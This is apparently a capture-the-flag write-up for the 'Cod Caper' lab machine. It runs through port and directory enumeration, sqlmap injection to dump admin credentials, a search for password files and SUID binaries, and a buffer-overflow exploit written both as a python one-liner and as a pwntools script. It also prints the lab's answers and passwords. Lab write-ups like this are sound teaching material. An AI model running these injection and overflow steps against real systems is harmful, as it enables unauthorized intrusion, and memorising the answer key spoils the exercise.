# The Cod Caper
# 26-05-2022
# little human
## level : easy

> Machine IP : `10.10.7.129`


## Host Enumeration

> Nmap scanning 
```
nmap -A -p1-1000 10.10.7.129 -oN nmap.txt
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many ports are open on the targete machine ? | 2 |
| What is the http-title of the web server ? | Apache2 Ubuntu Default Page: It works |
| What version is the ssh service ? | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| What is the version of the web server ? | Apache/2.4.18 |


## Web Enumeration

> Downloading the wordlist 
```
wget https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt
```
> Gobuster Scanning 
```
gobuster dir -u http://10.10.7.129 --wordlist big.txt -x php,txt,html -t 60| tee directory.txt

```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the name of the important file on the server ? | administrator.php |



## Web Exploitation

> sqlmap scanning
```
sqlmap -u http://10.10.7.129/administrator.php --forms post -a 
```

> after founding the databases we can run the following command
```
sqlmap -u http://10.10.7.129/administrator.php --forms post -a -D users --tables users
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the admin username ? | pingudad |
| What is the admin password ? | secretpass |
| How many forms of SQLI is the form vulnerable to ? | 3 |


## Command Executation

> login to the above form using the credential obtain previously.

> checking other users 
```
cat /etc/passwd | grep home 
```

### findig the SSH password

> finding the hidden password file
```
find / -type f -name *pass* 2>/dev/null
```
> now we found a file with the password
```
/var/hidden/pass
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many files are in the current directory ? | 3 |
| Do I still have an account | yes |
| What is my SSH password ? | pinguapingu |


## LinEnum

> finding the file with suid bit set
```
find / -type f -user root -perm /4000 2>/dev/null

```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the interesting path of the interesting suid file | /opt/secret/root |


## pwndbg

> debuging the file
```
gdb /opt/secret/root

```
> when the file starts we have to enter the following to check cyclic character 
```
r < <(cycllic 50)
```

> after completing the above command if we run `cyclic -l 0x6161616c` we can see the output is 44. which means we need 44 character to overwrite EIP.



## Binary-Exploitation : Manually

> manually exploit 
```
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

## Binary-Exploitation : The pwntools way

> python script 
```
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()

```


## Finishing the job

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the root password ? | love2fish |






#        THE END 
